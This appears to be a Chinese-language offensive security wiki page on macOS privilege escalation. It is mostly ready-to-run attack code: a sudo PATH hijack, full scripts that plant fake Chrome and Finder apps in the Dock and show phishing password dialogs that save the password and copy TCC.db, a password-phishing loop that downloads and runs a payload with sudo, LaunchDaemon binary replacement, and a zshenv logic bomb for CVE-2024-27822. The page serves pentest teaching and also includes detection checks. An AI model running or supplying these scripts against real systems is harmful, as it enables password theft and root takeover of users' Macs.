# macOS 权限提升

{{#include ../../banners/hacktricks-training.md}}

## TCC 权限提升

如果你来这里是为了查找 TCC 权限提升，请前往：


{{#ref}}
macos-security-protections/macos-tcc/
{{#endref}}

## Linux 权限提升

许多影响 Linux 或其他类 Unix 系统的权限提升技术同样适用于 macOS。请参阅：


{{#ref}}
../../linux-hardening/linux-basics/linux-privilege-escalation/README.md
{{#endref}}

## 用户交互

### Sudo Hijacking

你可以在 [Linux 权限提升文章中的 Sudo Hijacking 技术](../../linux-hardening/linux-basics/linux-privilege-escalation/index.html#sudo-hijacking)找到原始内容。

然而，macOS 在用户执行 **`sudo`** 时会**保留**用户的 **`PATH`**。这意味着，实现此攻击的另一种方法是**劫持受害者运行 `sudo` 时仍会执行的其他二进制文件：**

```bash
# Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
cat > /opt/homebrew/bin/ls <<'EOF'
#!/bin/bash
if [ "$(id -u)" -eq 0 ]; then
    whoami > /tmp/privesc
fi
/bin/ls "$@"
EOF
chmod +x /opt/homebrew/bin/ls

# victim
sudo ls
```

注意，使用终端的用户很可能安装了 **Homebrew**。因此，可以劫持 **`/opt/homebrew/bin`** 中的二进制文件。

### Dock Impersonation

通过一些**社会工程学**手段，你可以在 Dock 中**冒充** Google Chrome 等应用，实际执行自己的脚本：

{{#tabs}}
{{#tab name="Chrome Impersonation"}}
一些建议：

- 检查 Dock 中是否有 Chrome；如果有，**移除**该项，并在 Dock 数组中的相同位置**添加** **伪造的** **Chrome 项**。

<details>
<summary>Chrome Dock 冒充脚本</summary>

```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%Chrome%';

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
cat > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    char *cmd = "open /Applications/Google\\\\ Chrome.app & "
                "sleep 2; "
                "osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
                "PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Enter your password to update Google Chrome:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"Applications:Google Chrome.app:Contents:Resources:app.icns\")' -e 'end tell' -e 'return userPassword'); "
                "echo $PASSWORD > /tmp/passwd.txt";
    system(cmd);
    return 0;
}
EOF

gcc /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c -o /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome
rm -rf /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << 'EOF' > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>CFBundleExecutable</key>
    <string>Google Chrome</string>
    <key>CFBundleIdentifier</key>
    <string>com.google.Chrome</string>
    <key>CFBundleName</key>
    <string>Google Chrome</string>
    <key>CFBundleVersion</key>
    <string>1.0</string>
    <key>CFBundleShortVersionString</key>
    <string>1.0</string>
    <key>CFBundleInfoDictionaryVersion</key>
    <string>6.0</string>
    <key>CFBundlePackageType</key>
    <string>APPL</string>
    <key>CFBundleIconFile</key>
    <string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```

</details>

{{#endtab}}

{{#tab name="Finder Impersonation"}}
一些建议：

- 你**无法从 Dock 中移除 Finder**，所以如果要将它添加到 Dock，可以把假的 Finder 放在真的 Finder 旁边。为此，你需要**将假的 Finder 条目添加到 Dock 数组的开头**。
- 另一种做法是不把它放在 Dock 中，而是直接打开它；“Finder 要求控制 Finder”并不算奇怪。
- 另一种**无需询问密码即可提权到 root**的方法是用一个很糟糕的对话框，让 Finder 确实要求输入密码来执行特权操作：
  - 让 Finder 将新的 **`sudo`** 文件复制到 **`/etc/pam.d`**（要求输入密码的提示会显示“Finder 要复制 sudo”）
  - 让 Finder 复制一个新的 **Authorization Plugin**（你可以控制文件名，让要求输入密码的提示显示“Finder 要复制 Finder.bundle”）

<details>
<summary>Finder Dock impersonation script</summary>

```bash
#!/bin/sh

# THIS REQUIRES Finder TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%finder%';

rm -rf /tmp/Finder.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Finder.app/Contents/MacOS
mkdir -p /tmp/Finder.app/Contents/Resources

# Payload to execute
cat > /tmp/Finder.app/Contents/MacOS/Finder.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    char *cmd = "open /System/Library/CoreServices/Finder.app & "
                "sleep 2; "
                "osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
                "PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Finder needs to update some components. Enter your password:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"System:Library:CoreServices:Finder.app:Contents:Resources:Finder.icns\")' -e 'end tell' -e 'return userPassword'); "
                "echo $PASSWORD > /tmp/passwd.txt";
    system(cmd);
    return 0;
}
EOF

gcc /tmp/Finder.app/Contents/MacOS/Finder.c -o /tmp/Finder.app/Contents/MacOS/Finder
rm -rf /tmp/Finder.app/Contents/MacOS/Finder.c

chmod +x /tmp/Finder.app/Contents/MacOS/Finder

# Info.plist
cat << 'EOF' > /tmp/Finder.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>CFBundleExecutable</key>
    <string>Finder</string>
    <key>CFBundleIdentifier</key>
    <string>com.apple.finder</string>
    <key>CFBundleName</key>
    <string>Finder</string>
    <key>CFBundleVersion</key>
    <string>1.0</string>
    <key>CFBundleShortVersionString</key>
    <string>1.0</string>
    <key>CFBundleInfoDictionaryVersion</key>
    <string>6.0</string>
    <key>CFBundlePackageType</key>
    <string>APPL</string>
    <key>CFBundleIconFile</key>
    <string>app</string>
</dict>
</plist>
EOF

# Copy icon from Finder
cp /System/Library/CoreServices/Finder.app/Contents/Resources/Finder.icns /tmp/Finder.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Finder.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```

</details>

{{#endtab}}
{{#endtabs}}

### 密码提示钓鱼 + sudo 重用

恶意软件经常滥用用户交互来**窃取可用于 sudo 的密码**，并通过程序重复使用。常见流程：

1. 使用 `whoami` 确定已登录用户。
2. **循环弹出密码提示**，直到 `dscl . -authonly "$user" "$pw"` 返回成功。
3. 缓存凭据（例如 `/tmp/.pass`），并通过 `sudo -S`（通过 stdin 传递密码）执行特权操作。

最小示例链：

```bash
user=$(whoami)
while true; do
  read -s -p "Password: " pw; echo
  dscl . -authonly "$user" "$pw" && break
done
printf '%s\n' "$pw" > /tmp/.pass
curl -o /tmp/update https://example.com/update
printf '%s\n' "$pw" | sudo -S xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update
```

被窃取的密码随后可用于**通过 `xattr -c` 清除 Gatekeeper 隔离标记**、复制 LaunchDaemons 或其他特权文件，并以非交互方式运行后续阶段。<sup>[[1]](#references)</sup>

#### 通过 PAM 验证捕获的密码

外观类似原生界面的安全文本提示可收集候选账户密码，并通过进程内的 PAM 验证，而无需启动 `dscl`、`security` 或 `osascript`。调用方使用 `pam_start` 启动 PAM 事务，通过对话回调提供候选密码，调用 `pam_authenticate`，再用 `pam_end` 结束事务。验证失败时可返回密码输入框；验证成功则确认密码，无需启动单独的验证进程。仅通过 PAM 身份验证**不会**提升调用方的权限，也不会授权其执行特权操作。<sup>[[9]](#references)[[10]](#references)</sup>

如果登录密码与 Keychain 密码相同，捕获的密码也可能适用于需要当前 Keychain 密码的操作；请参阅 [Keychain ACL and partition-list constraints](../macos-red-teaming/macos-keychain.md)。<sup>[[10]](#references)</sup>

## 较新 macOS 特有的攻击向量（2023–2026）

### 已弃用的 `AuthorizationExecuteWithPrivileges` 仍可使用

`AuthorizationExecuteWithPrivileges` 自 10.7 起已弃用，但**在 Sonoma/Sequoia 上仍然有效**。许多商业更新程序会使用不受信任的路径调用 `/usr/libexec/security_authtrampoline`。如果目标二进制文件可由用户写入，你就可以植入木马并利用合法的提示：

```bash
# find vulnerable helper calls
log stream --info --predicate 'eventMessage CONTAINS "security_authtrampoline"'

# replace expected helper
cp /tmp/payload /Users/me/Library/Application\ Support/Target/helper
chmod +x /Users/me/Library/Application\ Support/Target/helper
# when the app updates, the root prompt spawns your payload
```

结合上面的 **masquerading tricks**，呈现一个可信的密码对话框。


### Privileged helper / XPC 排查

许多现代第三方 macOS privescs 都遵循相同模式：**root LaunchDaemon** 从 **`/Library/PrivilegedHelperTools`** 暴露一个 **Mach/XPC service**，随后 helper 要么**不验证客户端**，要么**验证得太晚**（PID race），要么暴露一个会读取**用户可控路径/脚本**的 **root method**。许多近期 VPN 客户端、游戏启动器和更新程序中的 helper 漏洞都属于此类问题。<sup>[[2]](#references)</sup>

快速排查清单：

```bash
ls -l /Library/PrivilegedHelperTools /Library/LaunchDaemons
plutil -p /Library/LaunchDaemons/*.plist 2>/dev/null | rg 'MachServices|Program|ProgramArguments|Label'
for f in /Library/PrivilegedHelperTools/*; do
  echo "== $f =="
  codesign -dvv --entitlements :- "$f" 2>&1 | rg 'identifier|TeamIdentifier|com.apple'
  strings "$f" | rg 'NSXPC|xpc_connection|AuthorizationCopyRights|authTrampoline|/Applications/.+\.sh'
done
```

特别留意以下 helper：

- 在 **uninstall 后**仍继续接受请求，因为 job 仍加载在 `launchd` 中
- 执行脚本或从 **`/Applications/...`** 或其他非 root 用户可写的路径读取配置
- 依赖基于 **PID** 或仅基于 **bundle-id** 的对端验证，而这些验证可能存在竞态条件

有关 helper 授权漏洞的更多详情，请查看[此页面](macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/macos-xpc-authorization.md)。

### PackageKit 脚本环境继承（CVE-2024-27822）

在 Apple 于 **Sonoma 14.5**、**Ventura 13.6.7** 和 **Monterey 12.7.5** 中修复此问题之前，用户通过 **`Installer.app`** / **`PackageKit.framework`** 发起安装时，可能会在当前用户的环境中以 root 身份执行 **PKG 脚本**。这意味着，使用 **`#!/bin/zsh`** 的软件包会加载攻击者的 **`~/.zshenv`**，并在受害者安装软件包时以 **root** 身份运行它。<sup>[[3]](#references)</sup>

这尤其适合作为 **logic bomb**：你只需要在用户账户中取得立足点，并拥有一个可写的 shell 启动文件，然后等待用户执行任何有漏洞的、基于 **zsh** 的安装程序。此问题通常**不适用于** **MDM/Munki** 部署，因为这些部署在 root 用户的环境中运行。<sup>[[3]](#references)</sup>

```bash
# inspect a vendor pkg for shell-based install scripts
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec head -n1 {} \;
rg -n '^#!/bin/(zsh|bash)' /tmp/target-pkg

# logic bomb example for vulnerable zsh-based installers
echo 'id > /tmp/pkg-root' >> ~/.zshenv
```

如果想深入了解针对 installer 的滥用，也可以查看[此页面](macos-files-folders-and-binaries/macos-installers-abuse.md)。

### 通过 `.localized` 造成 installer 目标路径冲突

某些第三方 installer 会注册一个 root LaunchDaemon，其可执行文件通过 `/Applications/Target.app` 内的固定路径引用。如果攻击者能先创建该 bundle，并使用**不同的 bundle identifier**，Installer 可能会保留这个诱饵 bundle，并将真正的 app 放到 `/Applications/Target.localized/Target.app`。Daemon 仍然指向原路径。因此，诱饵 bundle 中由攻击者控制的可执行文件之后就可能以 root 身份运行。<sup>[[8]](#references)</sup>

重要的前提条件如下：<sup>[[8]](#references)</sup>

1. 攻击者可以创建或控制预期的 application 路径。
2. package 不会删除冲突的 bundle。
3. 特权 job 使用该 bundle 内的硬编码路径。
4. 用户或 MDM 工作流安装 package 并注册该 job。

查找被重新定位的 bundle，然后使用下一节中的枚举循环检查 LaunchDaemon 的目标：<sup>[[8]](#references)</sup>

```bash
find /Applications -type d -name '*.localized' -prune -print
for app in /Applications/*.app; do
  [ -d "$app" ] && stat -f '%Su:%Sg %Sp %N' "$app"
done
```

更安全的安装程序会解析最终的 bundle 位置，并将特权可执行文件保存在 root 拥有的位置，例如 `/Library/PrivilegedHelperTools`。在注册或启动任务之前，它还应验证所有权和代码签名。<sup>[[8]](#references)</sup>

### 可写 LaunchDaemon 目标劫持

LaunchDaemon plist 可能由 root 拥有，但其 `Program` 或 `ProgramArguments` 的第一个条目却指向用户可写的目录。检查**整个路径**，而不只是可执行文件的权限模式。如果父目录可写，攻击者就可能重命名一个由 root 拥有的可执行文件，并在相同路径创建替代文件。下次任务启动时，替代文件便会以 root 身份运行。重启或正常重启服务就足够了。攻击者不需要在 system 域中运行 `launchctl bootstrap` 的权限。<sup>[[7]](#references)</sup>

首先枚举每个目标及其直接父目录：<sup>[[7]](#references)</sup>

```bash
for p in /Library/LaunchDaemons/*.plist; do
  target=$(plutil -extract Program raw -o - "$p" 2>/dev/null)
  [ -n "$target" ] ||
    target=$(plutil -extract ProgramArguments.0 raw -o - "$p" 2>/dev/null)
  [ -n "$target" ] || continue
  printf '\n%s -> %s\n' "$p" "$target"
  ls -ld "$target" "$(dirname "$target")" 2>/dev/null
done
```

当文件或其父目录可写时，保留原始二进制文件，并将该路径替换为可执行 payload。然后等待已加载的 daemon 重启。<sup>[[7]](#references)</sup>

```bash
target=/path/from/the/plist
mv "$target" "$target.real"
cp /tmp/payload "$target"
chmod 755 "$target"
```

### XNU SMR 凭据指针竞争（CVE-2025-24118）

存在漏洞的 `kauth_cred_proc_update` 路径使用非原子 `zalloc_ro_mut` API 更新 `proc_ro.p_ucred`，而 SMR 读取者在未加锁的情况下加载该指针。公开的触发方式使用经过特殊准备的 setgid 二进制文件。一个线程在真实组 ID 和有效组 ID 之间切换，同时另一个线程反复调用 `getgid()` 等系统调用。<sup>[[4]](#references)</sup>

```c
// Writer thread inside a setgid binary
while (1) {
    setgid(real_gid);
    setgid(effective_gid);
}
// Reader thread
while (1) observed_gid = getgid();
```

将其视为一种 **race 原语**，而不是现成的 root exploit。已发布的 PoC 展示了凭据指针撕裂的情况，通常会导致 kernel panic。研究人员只在 Intel 上复现了这种损坏，并未实现对生成的凭据对象的确定性控制。Apple 在 macOS 15.3 中将更新改为原子指针交换。<sup>[[4]](#references)</sup>

### 通过 Migration assistant 绕过 SIP（“Migraine”，CVE-2023-32369）

即使已经拥有 root，SIP 仍会阻止对系统位置的写入。**Migraine** 漏洞滥用 Migration Assistant entitlement `com.apple.rootless.install.heritable`，生成一个继承 SIP bypass 的子进程，并覆盖受保护的路径（例如 `/System/Library/LaunchDaemons`）。<sup>[[5]](#references)</sup>利用链如下：

1. 在运行中的系统上获取 root。
2. 使用精心构造的状态触发 `systemmigrationd`，使其运行攻击者控制的二进制文件。
3. 利用继承的 entitlement 修改受 SIP 保护的文件，且修改在重启后仍然存在。

### NSPredicate/XPC 表达式注入（CVE-2023-23530/23531 漏洞类别）

多个 Apple 守护进程通过 XPC 接收 **NSPredicate** 对象，却只验证由攻击者控制的 `expressionType` 字段。通过构造可执行任意 selector 的 predicate，可以在 **root/system XPC 服务中实现代码执行**（例如 `coreduetd`、`contextstored`）。若与初始的 app sandbox escape 结合，就能**在无需用户提示的情况下提升权限**。查找会反序列化 predicate、但缺少健壮 visitor 的 XPC 端点。<sup>[[6]](#references)</sup>

## TCC - Root 权限提升

### CVE-2020-9771 - mount_apfs TCC bypass 和权限提升

**任何用户**（包括无特权用户）都可以使用 `-o noowners` 创建并挂载 Time Machine 快照，进而**访问该快照中的所有文件**，绕过对实时卷的所有权检查。唯一需要的权限是所用应用（例如 `Terminal`）拥有**完全磁盘访问权限**（`kTCCServiceSystemPolicyAllfiles`）。

命令和完整说明见 TCC bypasses 页面：

{{#ref}}
macos-security-protections/macos-tcc/macos-tcc-bypasses/README.md
{{#endref}}

## 敏感信息

以下内容可能有助于提升权限：


{{#ref}}
macos-files-folders-and-binaries/macos-sensitive-locations.md
{{#endref}}



{{#include ../../banners/hacktricks-training.md}}

## References

- [1] [Pentest Partners - 2025：信息窃取程序之年](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [2] [CVE-2024-30165：AWS Client VPN for macOS 本地权限提升](https://blog.emkay64.com/macos/CVE-2024-30165-finding-and-exploiting-aws-client-vpn-on-macos-for-local-privilege-escalation/)
- [3] [CVE-2024-27822：macOS PackageKit 权限提升](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [4] [TRAVERTINE：CVE-2025-24118](https://jprx.io/cve-2025-24118/)
- [5] [Microsoft “Migraine” SIP bypass（CVE-2023-32369）](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
- [6] [Trellix Advanced Research Center - macOS 和 iOS 上一种新的权限提升漏洞类别（CVE-2023-23530/23531）](https://www.trellix.com/en-sg/blogs/research/trellix-advanced-research-center-discovers-a-new-privilege-escalation-bug-class-on-macos-and-ios/)
- [7] [LaunchDaemon 劫持：通过不安全的文件夹权限实现权限提升和持久化](https://bradleyjkemp.dev/post/launchdaemon-hijacking/)
- [8] [通过 .localized 目录在 macOS 上实现 LPE](https://theevilbit.github.io/posts/localized/)
- [9] [Jamf Threat Labs - PamStealer：伪装成剪贴板管理应用的 macOS 恶意软件](https://www.jamf.com/blog/pamstealer-macos-infostealer-applescript-rust/)
- [10] [Kaspersky Securelist - 深入分析 MacSync](https://securelist.com/macsync-new-version/121383/)
